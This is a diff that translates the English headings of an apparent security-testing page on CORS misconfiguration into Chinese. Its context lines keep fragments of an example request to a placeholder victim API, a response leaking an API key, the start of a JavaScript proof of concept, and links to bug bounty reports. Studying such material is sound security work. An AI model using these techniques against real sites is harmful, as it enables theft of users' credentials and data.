@@ -1,12 +1,12 @@
-# CORS Misconfiguration(误配置)
+# CORS 误配置
 
 > CORS配置错误出现在API上。这允许攻击者代表用户发出跨源请求，因为应用程序没有白名单源头，并且具有访问控制允许凭据：这意味着我们可以使用受害者的凭据从攻击者的站点发出请求
 
 ## 概要
 
 * [前提](#前提)
-* [Exploitation](#exploitation)
-* [References](#references)
+* [漏洞利用](#漏洞利用)
+* [引用](#引用)
 
 ## 前提
 
@@ -18,7 +18,7 @@
 
 Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target **https://victim.example.com/endpoint**.
 
-### Vulnerable example 
+### 攻击例子
 
 ```powershell
 GET /endpoint HTTP/1.1
@@ -33,7 +33,7 @@ Access-Control-Allow-Credentials: true
 {"[private API key]"}
 ```
 
-### Proof of concept
+### 证明
 
 ```js
 var req = new XMLHttpRequest(); 
@@ -74,7 +74,7 @@ or
  </html>
 ```
 
-## Bug Bounty reports
+## bug赏金公告
 
 * [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax)](https://hackerone.com/reports/168574)
 * [CORS misconfig | Account Takeover - niche.co - Rohan (nahoragg)](https://hackerone.com/reports/426147)
@@ -82,7 +82,7 @@ or
 * [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t)](https://hackerone.com/reports/430249)
 * [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7)](https://hackerone.com/reports/470298)
 
-## References
+## 引用
 
 * [Think Outside the Scope: Advanced CORS Exploitation Techniques - @Sandh0t - May 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
 * [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle | 14 October 2016](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
